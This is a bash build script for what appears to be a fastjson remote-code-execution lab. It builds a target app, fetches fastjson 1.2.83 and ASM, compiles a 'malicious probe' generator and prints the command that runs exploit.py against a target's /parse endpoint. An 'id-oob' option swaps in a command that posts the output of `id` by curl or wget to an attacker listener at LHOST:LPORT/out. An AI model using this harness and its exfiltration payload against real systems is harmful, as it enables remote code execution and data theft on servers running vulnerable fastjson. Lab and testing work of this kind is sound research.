#!/bin/bash
# 构建靶场 + 生成恶意 probe
set -e
cd "$(dirname "$0")/.."

LHOST=${1:-"127.0.0.1"}
LPORT=${2:-"19090"}
CMD=${3:-"open -a Calculator"}
MODE=${4:-"fd"}
TAG=${5:-""}
if [ "$CMD" = "id-oob" ]; then
    CMD="id 2>&1 | { curl -fsS -X POST --data-binary @- http://$LHOST:$LPORT/out || wget -qO- --post-file=- http://$LHOST:$LPORT/out; }"
fi

echo "[*] Building target app..."
if [ -x "../tools/apache-maven-3.9.16/bin/mvn" ]; then
    ../tools/apache-maven-3.9.16/bin/mvn package -DskipTests -q
elif command -v mvn >/dev/null 2>&1; then
    mvn package -DskipTests -q
else
    docker run --rm \
        -v "$PWD:/src" \
        -v "$HOME/.m2:/root/.m2" \
        -w /src \
        maven:3.9-eclipse-temurin-8 \
        mvn package -DskipTests -q
fi

echo "[*] Downloading dependencies..."
mkdir -p poc/lib
[ -f poc/lib/asm-9.6.jar ] || curl -sL -o poc/lib/asm-9.6.jar https://repo1.maven.org/maven2/org/ow2/asm/asm/9.6/asm-9.6.jar
[ -f poc/lib/fastjson-1.2.83.jar ] || curl -sL -o poc/lib/fastjson-1.2.83.jar https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar

echo "[*] Compiling probe generator..."
if command -v javac >/dev/null 2>&1; then
    javac -cp "poc/lib/*" -d poc poc/GenProbe.java
else
    docker run --rm \
        -v "$PWD:/src" \
        -w /src \
        maven:3.9-eclipse-temurin-8 \
        javac -cp "poc/lib/*" -d poc poc/GenProbe.java
fi

echo "[*] Generating probe (lhost=$LHOST lport=$LPORT mode=$MODE tag=${TAG:-default} cmd=$CMD)..."
if command -v java >/dev/null 2>&1; then
    java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe "$LHOST" "$LPORT" "$CMD" "$MODE" "$TAG"
else
    docker run --rm \
        -v "$PWD:/src" \
        -w /src \
        maven:3.9-eclipse-temurin-8 \
        java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe "$LHOST" "$LPORT" "$CMD" "$MODE" "$TAG"
fi

echo "[+] Done. Run with:"
echo "    java -jar target/fastjson-rce-env-1.0.0.jar"
echo "    python3 poc/exploit.py $LHOST $LPORT http://TARGET:18080 /parse --mode $MODE${TAG:+ --tag $TAG}"
